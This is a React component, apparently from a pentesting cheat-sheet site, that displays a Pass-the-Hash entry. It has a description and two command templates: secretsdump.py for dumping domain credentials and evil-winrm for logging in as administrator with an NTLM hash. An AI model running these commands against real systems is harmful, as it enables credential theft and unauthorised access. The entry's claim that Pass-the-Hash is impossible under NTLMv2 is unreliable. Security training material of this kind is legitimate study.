import {
  Typography,
  Accordion,
  AccordionSummary,
  AccordionDetails,
  Box,
} from "@mui/material";
import SyntaxHighlighter from "react-syntax-highlighter";
import ExpandMoreIcon from "@mui/icons-material/ExpandMore";

interface IProps {
  title: string;
}

const PassTheHash = ({ title }: IProps) => {
  return (
    <>
      {" "}
      <Accordion sx={{ backgroundColor: "primary.main" }}>
        <AccordionSummary
          expandIcon={<ExpandMoreIcon />}
          aria-controls="panel1a-content"
          id="panel1a-header"
        >
          <Typography>{title}</Typography>
        </AccordionSummary>
        <AccordionDetails
          sx={{ backgroundColor: "primary.background_accordian" }}
        >
          <Typography
            sx={{
              color: "primary.main",
            }}
          >
            <Typography variant="h6">Description</Typography>
            <Typography>
              A Pass-the-Hash (PtH) attack is a technique whereby an attacker
              captures a password hash (as opposed to the password characters)
              and then simply passes it through for authentication and
              potentially lateral access to other networked systems. The threat
              actor doesn’t need to decrypt the hash to obtain a plain text
              password. Note: PtH is not possible with NTLMv2. NTLM has been
              succeeded by NTLMv2, which is a hardened version of the original
              NTLM protocol. NTLMv2 includes a time-based response, which makes
              simple pass the hash attacks impossible.
            </Typography>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 1</Typography>
            <Typography>
              This step is not needed, if you have obtained the NTLM hash other
              way, then you can go straight to step 2. This step is just a
              common way to dump credentials.
            </Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"secretsdump.py {DOMAIN}/{USER}@{IP}"}
            </SyntaxHighlighter>
            <Box sx={{ m: 4 }} />
            <Typography variant="h6">Step 2</Typography>
            <SyntaxHighlighter className="syntax" language="bash">
              {"evil-winrm -H {NTLM_HASH} -u administrator -i {IP}"}
            </SyntaxHighlighter>
          </Typography>
        </AccordionDetails>
      </Accordion>
    </>
  );
};

export default PassTheHash;
